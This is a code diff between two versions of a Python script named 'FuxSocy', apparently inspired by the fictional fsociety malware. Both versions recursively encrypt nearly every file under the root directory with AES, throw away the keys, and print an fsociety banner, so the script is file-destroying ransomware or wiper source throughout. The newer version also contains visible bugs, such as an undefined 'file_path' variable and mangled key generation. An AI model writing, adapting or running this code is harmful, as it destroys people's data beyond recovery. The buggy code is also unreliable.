@@ -1,134 +1,94 @@
-#!/usr/bin/python3
+#!/usr/bin/python
 
 import os
-import time
-import sys
 import subprocess
+import sys
 from Crypto.Cipher import AES
-from Crypto.Hash import SHA256
 from Crypto import Random
 from random import SystemRandom
-from string import ascii_letters, digits, punctuation
-
-START_DIR = '/'
-SALT = 'fsociety'
-CS = 64*1024
 
 
-def encrypt(root, filename, key):
-    if ('fuxsocy.py' not in filename) and ('fsociety00.dat' not in filename) and ('python3' not in filename):
-        file_path = root + '/' + filename
-        file_size = str(os.path.getsize(file_path)).zfill(16)
-        iv = Random.new().read(16)
-        encryptor = AES.new(key, AES.MODE_CBC, iv)
-        try:
-            with open(file_path, 'rb') as infile:
-                with open(file_path, 'wb') as outfile:
-                    outfile.write(file_size.encode('utf-8'))
-                    outfile.write(iv)
-                    while True:
-                        chunk = infile.read(CS)
-                        if len(chunk) == 0:
-                            break
-                        elif len(chunk) % 16 != 0:
-                            chunk += b' ' * (16 - (len(chunk) % 16))
-                        outfile.write(encryptor.encrypt(chunk))
-        except:
-            pass
+def encrypt(filepath, key):
+    file_size = str(os.path.getsize(filepath)).zfill(16)
+    initialization_vector = Random.new().read(16)
+    encryptor = AES.new(key, AES.MODE_CBC, initialization_vector)
+    with open(file_path, 'rb') as infile:
+        with open(file_path, 'wb') as outfile:
+            outfile.write(file_size.encode('utf-8'))
+            outfile.write(initialization_vector)
+            while True:
+                chunk = infile.read(65536)
+                if len(chunk) == 0:
+                    break
+                elif len(chunk) % 16 != 0:
+                    chunk += b' ' * (16 - (len(chunk) % 16))
+                outfile.write(encryptor.encrypt(chunk))
 
-def recurse(directory, key):
+def load_entropy():
+    print "Loading Source of Entropy"
+    source = os.urandom(256)
+    for i in range(3):
+      source += os.urandom(2 ** (21 + i))
+      update_progress(((i + 1.0) / 3.0))
+    print "\n"
+    return source
+
+def update_progress(progress):
+    bar_length = 23
+    status = "({}%)".format(str(progress)[2:4])
+    if progress >= 1.0:
+        progress = 1
+        status = "COMPLETE"
+    block = int(round(bar_length * progress))
+    text = "\r{0}\t\t{1}".format("#" * block + " " * (bar_length - block), status)
+    sys.stdout.write(text)
+    sys.stdout.flush()
+
+def generate_keys(source):
+    print "Generating Keys"
+    keys = []
+    for i in range(3):
+        keys.append(''.join(SystemRandom().choice(source) for x in range(SystemRandom().randint(256, 512)) for x in range(256, 512)))
+        update_progress(((i + 1.0) / 3.0))
+    print "\n"
+    return keys
+
+def locate_files():
+    print "Locating target files."
+    targets = next(os.walk('/'))[1]
+    for core in ('proc', 'sys', 'lib', 'run'):
+        targets.remove(core)
+    return targets
+
+def encrypt_dir(directory, key):
     root = next(os.walk(directory))[0]
     directories = next(os.walk(directory))[1]
     files = next(os.walk(directory))[2]
 
-    for file in files:
-        try:
-            encrypt(root, file, key)
-        except:
-            pass
-        
+    if len(files) > 0:
+        for file in files:
+            path = root + '/' + file
+            encrypt(path, key)
+
     if len(directories) > 0:
         for directory in directories:
-            try:
-                subdirectories = next(os.walk(os.path.join(root, directory)))[1]
-                subfiles = next(os.walk(os.path.join(root, directory)))[2]
-                for subfile in subfiles:
-                    try:
-                        encrypt(next(os.walk(os.path.join(root, directory)))[0], subfile, key)
-                    except:
-                        pass
-                if len(subdirectories) > 0:
-                    for subdirectory in subdirectories:
-                        path = root + '/' + directory + '/' + subdirectory
-                        try:
-                            recurse(directory=path, key=key)
-                        except:
-                            pass
-            except:
-                pass
-
-def gen_key(salt):
-    os.urandom(16)
-    print('Loading Source of Entropy')
-    password = salt.join((''.join(SystemRandom().choice(ascii_letters + digits + punctuation) for x in range(SystemRandom().randint(40, 160)))) for x in range(SystemRandom().randint(80, 120)))
-    update_progress(0.3)
-    time.sleep(0.4)
-    update_progress(0.6)
-    time.sleep(0.2)
-    update_progress(1)
-    print()
-    print('\nGenerating Keys')
-    update_progress(0.3)
-    hasher = SHA256.new(password.encode('utf-8'))
-    time.sleep(0.6)
-    update_progress(0.5)
-    time.sleep(0.6)
-    update_progress(1)
-    print()
-    print()
-    return hasher.digest()
-
-
-def update_progress(progress):
-    barLength = 23
-    status = ""
-    if isinstance(progress, int):
-        progress = float(progress)
-    if progress >= 1:
-        progress = 1
-        status = "COMPLETE"
-    block = int(round(barLength*progress))
-    text = "\r{0}\t\t{1}".format("#"*block + " "*(barLength-block), status)
-    sys.stdout.write(text)
-    sys.stdout.flush()
-
+            path = root + '/' + directory
+            encrypt_dir(path, key)
 
 def pwn():
-    subprocess.call('clear')
-    print('Executing FuxSocy')
-    key = gen_key(SALT)
-    print('Locating target files.')
-    dirs = next(os.walk(START_DIR))[1]
-    time.sleep(0.7)
-    print('beginning crypto operations')
+    keys = generate_keys(load_entropy())
+    dirs = locate_files()
+    print "beginning crypto operations"
     for dir in sorted(dirs):
-        if START_DIR == '/':
-            directory = START_DIR + dir
-        else:
-            directory = START_DIR + '/' + dir
-        if directory not in ('/sys', '/run', '/lib', '/proc'):
-            print('Encrypting {}'.format(directory))
-            recurse(directory, key)
-    files = next(os.walk(START_DIR))[2]
-    for file in files:
-        try:
-            encrypt(START_DIR, file, key)
-        except:
-            pass
-    del key
+        directory = '/%s' % dir
+        print "Encrypting {}".format(directory)
+        encrypt_dir(directory, key=SystemRandom().choice(keys[0] + keys[1] + keys[2]))
+    keys = []
+    del keys
     print("      __                _      _         \n     / _|              (_)    | |        \n    | |_ ___  ___   ___ _  ___| |_ _   _ \n    |  _/ __|/ _ \ / __| |/ _ \ __| | | |\n    | | \__ \ (_) | (__| |  __/ |_| |_| |\n    |_| |___/\___/ \___|_|\___|\__|\__, |\n                                    __/ |\n                                   |___/ \n\ncddddddddddddddddddddddddddddddddddddddddddd;\n0Mo..........':ldkO0KKXXKK0kxoc,..........kMd\n0Ml......;d0WMMMMMMMMMMMMMMMMMMMWKx:......kMd\n0Ml...cOWMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:...kMd\n0Ml.lNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNc.kMd\n0MdKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM0OMd\n0MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMd\n0MxcxWMMMMMNXXNMMMMMMMMMMMMMMMNXXNMMMMMWkcKMd\n0Md..lMKo,.,'...:kWMMMMMMMNx;...',.;dXMl.'XMd\n0Mx'.,O;dXMMMXl....:dWMNo;....oXMMMKd;0,.'KMd\n0MO;.,NMWMMMMMMWk;...XMK...:OWMMMMMMWMN,.cNMd\n0MxxNMX;KMMKdcclkWN0WMMMN0WNxc:lxXMMk;WMXdKMd\n0MMMMMO;MMl.......KMXOMNkMk.......xMM.NMMMMMd\n0MMMMMMXKoclddl;.oWMdkMN,MN:.:ldolcdXNMMMMMMd\n0MMMMMMWXMMMMMMMW0KdoNMMdox0MMMMMMMMXMMMMMMMd\n0MMMMXc'WMMMMMMMMkcWMMMMMMkcMMMMMMMMN'lXMMMMd\n0MMMd..cMMMMMMMMNdoKMMMMM0x:XMMMMMMMM:..kMMMd\n0MM0....d0KKOd:.....c0Kx'.....:d0NX0l....NMMd\n0MMO.....................................WMMd\n0Mdkc...................................0kOMd\n0Ml.:Ol;........';;.......;,........':oX:.kMd\n0Ml..,WMMMMWWWo...';;:c::;'...:WWMMMMMW;..kMd\n0Ml...dMMMMMMMMKl...........c0MMMMMMMMd...kMd\n0Ml...cMMMMMMMMMMMXOxdddk0NMMMMMMMMMMM'...kMd\n0Ml....KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMO....kMd\n0Ml.....OMMMMMMMMMMMMMMMMMMMMMMMMMMMK.....kMd\n0Ml......:XMMMMMMMMMMMMMMMMMMMMMMMNl......kMd\n0Ml........lXMMMMMMMMMMMMMMMMMMMKc........kMd\n0Ml..........:KMMMMMMMMMMMMMMM0,..........kMd\noO:............xOOOx:'';dOOOOd............lOc\n\n")
     exit(0)
 
-
 if __name__ == '__main__':
+    subprocess.call('clear')
+    print "Executing FuxSocy"
     pwn()
